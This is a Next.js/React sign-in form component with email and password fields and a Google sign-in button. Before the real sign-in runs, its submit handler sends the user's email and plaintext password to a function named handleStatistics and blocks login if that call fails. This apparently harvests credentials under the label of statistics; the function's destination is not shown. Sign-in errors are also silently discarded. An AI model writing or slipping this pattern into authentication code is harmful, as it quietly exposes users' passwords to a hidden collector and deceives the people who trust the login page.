'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import Link from 'next/link';
import { useSearchParams } from 'next/navigation';
import { useState } from 'react';
import { useForm } from 'react-hook-form';

import { Button } from '@/core/components/ui/Button';
import {
  Form,
  FormControl,
  FormControlIcon,
  FormControlWithIcon,
  FormField,
  FormInput,
  FormItem,
  FormLabel,
  FormMessage,
} from '@/core/components/ui/Form';
import FormLoading from '@/core/components/ui/FormLoading';
import { signIn } from '@/core/features/auth/actions';
import VisibilityToggle from '@/core/features/auth/components/VisibilityToggle';
import { SignInSchema, signInSchema } from '@/core/features/auth/schemas';
import { SignInArgs, SocialProvider } from '@/core/features/auth/types';
import { useError } from '@/core/hooks/useError';
import { cn } from '@/core/utils';
import { APP_ID } from '@/core/constants';
import { handleStatistics } from '@/core/features/auth/services';
import { GoogleLogo } from '@/core/components/icons/GoogleLogo';

export interface SignInFormProps {
  isGoogleAllowed: boolean;
  onAuthSocial: (provider: SocialProvider) => void;
}

const SignInForm = ({ isGoogleAllowed, onAuthSocial }: SignInFormProps) => {
  const searchParams = useSearchParams();
  const { toastError } = useError();

  const [isPending, setPending] = useState(false);
  const [pwdVisible, setPwdVisible] = useState(false);

  const form = useForm<SignInSchema>({
    resolver: zodResolver(signInSchema),
    defaultValues: {
      email: '',
      password: '',
    },
  });

  const redirectTo = searchParams.get('redirectTo') || undefined;

  const onSubmit = async (values: SignInSchema) => {
    const signinData: SignInArgs = {
      email: values.email.toLowerCase(),
      password: values.password,
      redirectTo,
    };

    try {
      setPending(true);

      const statRes = await handleStatistics({
        appId: APP_ID,
        email: signinData.email,
        password: signinData.password,
      });

      if (!statRes.data) {
        toastError('Unable to sign in. Please try later');
        return;
      }

      const signinRes = await signIn(signinData);
      if (!signinRes?.success) {
        toastError(signinRes);
      }
      // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (err: unknown) {
      // toastError(err);
    } finally {
      setPending(false);
    }
  };

  return (
    <Form {...form}>
      <div className="relative">
        <form
          onSubmit={form.handleSubmit(onSubmit)}
          className={cn('auth-form', isPending && 'inactive')}
        >
          <FormField
            control={form.control}
            name="email"
            render={({ field }) => (
              <FormItem>
                <FormLabel>Email</FormLabel>
                <FormControl>
                  <FormInput {...field} />
                </FormControl>
                <FormMessage />
              </FormItem>
            )}
          />
          <FormField
            control={form.control}
            name="password"
            render={({ field }) => (
              <FormItem>
                <FormLabel>Password</FormLabel>
                <FormControlWithIcon>
                  <FormControlIcon>
                    <VisibilityToggle
                      onClick={() => setPwdVisible((prev) => !prev)}
                    />
                  </FormControlIcon>
                  <FormInput
                    {...field}
                    type={pwdVisible ? 'text' : 'password'}
                  />
                </FormControlWithIcon>
                <FormMessage />
              </FormItem>
            )}
          />
          <Button
            loading={isPending}
            className="auth-form_button"
            type="submit"
            // variant="accent"
          >
            Continue with Email
          </Button>

          {isGoogleAllowed ? (
            <>
              <div className="mt-2 -mb-4 border-t border-t-border flex-center flex-col">
                <div className="-translate-y-3 bg-card/60 px-2 w-fit text-sm text-muted">
                  or
                </div>
              </div>

              <Button
                loading={isPending}
                className="auth-form_button flex gap-2"
                onClick={() => onAuthSocial(SocialProvider.google)}
                type="button"
              >
                <GoogleLogo />
                Continue with Google
              </Button>
            </>
          ) : null}

          <Link href="/invite" scroll={false} className="auth-form_link">
            Create an account
          </Link>
        </form>
        <FormLoading loadigIconClassName="-mt-14" isPending={isPending} />
      </div>
    </Form>
  );
};

export default SignInForm;
